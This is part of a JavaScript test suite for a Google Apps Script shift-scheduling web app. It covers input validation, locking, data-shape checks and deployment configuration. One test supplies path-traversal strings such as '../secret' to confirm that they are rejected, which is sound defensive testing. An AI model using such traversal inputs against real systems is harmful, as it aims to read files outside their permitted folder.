  // '../' や '/' を通すと、フォルダの外を指せてしまう
  quiet(function () {
    ['../secret', 'st1/../x', 'st 1', '', 'a'.repeat(50)].forEach(function (bad) {
      assert.throws(function () { sandbox.storeCellsFile_(bad, '2026-10'); },
        /店舗 ID が不正/, '通してしまった: ' + bad);
    });
    ['2026-1', '26-10', '2026/10', '', '2026-10-01'].forEach(function (bad) {
      assert.throws(function () { sandbox.storeCellsFile_('st1', bad); },
        /年月が不正/, '通してしまった: ' + bad);
    });
  });
});

test('ロックを取れなければ書かない', function () {
  quiet(function () {
    const d = fakeSs();
    const keepSs = sandbox.SpreadsheetApp.getActive;
    const keepLock = sandbox.LockService;
    sandbox.SpreadsheetApp.getActive = () => d.ss;
    sandbox.LockService = {
      getScriptLock: () => ({ tryLock: () => false, releaseLock: () => {} }),
    };
    try {
      assert.throws(function () { sandbox.storeWrite_('m', 0, { v: 1 }, false); },
        /待てませんでした/);
      assert.strictEqual(d.rows.length, 1, '書いてしまった');
    } finally {
      sandbox.SpreadsheetApp.getActive = keepSs;
      sandbox.LockService = keepLock;
    }
  });
});

test('マスタの形が違えば断る', function () {
  quiet(function () {
    withDrive(function () {
      assert.throws(function () { sandbox.apiDbSave(0, null, false); }, /形が違います/);
      assert.throws(function () { sandbox.apiDbSave(0, [1, 2], false); }, /形が違います/);
      assert.throws(function () { sandbox.apiMonthSave('st1', '2026-10', 0, 'x', false); },
        /形が違います/);
    });
  });
});

test('API はそのまま読み書きに繋がっている', function () {
  withDrive(function () {
    const w = sandbox.apiMonthSave('st1', '2026-10', 0, { 's1|2026-10|1': '○' }, false);
    assert.strictEqual(w.ok, true);
    const r = sandbox.apiMonthLoad('st1', '2026-10');
    assert.strictEqual(r.data['s1|2026-10|1'], '○');
    assert.strictEqual(r.rev, 1);
    // 別の月は空のまま
    assert.strictEqual(sandbox.apiMonthLoad('st1', '2026-11').rev, 0);
  });
});

// ---- Web アプリが出す画面 ---------------------------------------------
//
// 「デプロイしたのに古い画面が出る」を作らない。
// 実際、.claspignore が直下の *.html しか送らず、エディタ本体
// （prototype/ShiftGrid.html）が一度も push されていなかった。

test('doGet はエディタ本体を出す', function () {
  const src = fs.readFileSync(path.join(ROOT, 'WebApp.gs'), 'utf8');
  const at = src.indexOf('function doGet');
  const body = src.slice(at, src.indexOf('\nfunction ', at + 10));
  assert.ok(/WEBAPP_VIEW_FILE/.test(body), 'doGet が画面を指していない');
  assert.strictEqual(sandbox.WEBAPP_VIEW_FILE, 'prototype/ShiftGrid');
  // テンプレートに通すと <?xml ?> がスクリプトレットとして解釈されて壊れる
  assert.ok(/createHtmlOutputFromFile\(WEBAPP_VIEW_FILE\)/.test(body),
    'エディタをテンプレートに通している');
});

test('エディタは clasp で送られる', function () {
  const ig = fs.readFileSync(path.join(ROOT, '.claspignore'), 'utf8');
  assert.ok(/^!prototype\/ShiftGrid\.html$/m.test(ig),
    '.claspignore にエディタを送る指定が無い（push されず旧画面が出る）');
});

test('エディタはテンプレートに通せない形をしている', function () {
  // 通せない、を確かめておく。通せる形に戻ったら createTemplateFromFile に
  // 変えてよいが、そのときはこのテストが落ちて気づける
  const html = fs.readFileSync(path.join(ROOT, 'prototype', 'ShiftGrid.html'), 'utf8');
  assert.ok(html.indexOf('<?') >= 0,
    'スクリプトレットに見える文字列が無くなった。doGet を見直すこと');
});

test('画面のファイル名は .gs と衝突しない', function () {
  // Apps Script は名前が拡張子をまたいで一意でなければならない。
  // prototype/ShiftGrid.gs があると、どちらかが載らない
  const dup = fs.existsSync(path.join(ROOT, 'prototype', 'ShiftGrid.gs'));
  assert.strictEqual(dup, false, '同じ名前の .gs がある');
});

// ---- 結果 -------------------------------------------------------------

console.log(`\n${passed} passed, ${failures.length} failed`);
failures.forEach(function (f) {
  console.log(`\n  FAIL: ${f.name}\n        ${f.message}`);
});
process.exit(failures.length === 0 ? 0 : 1);
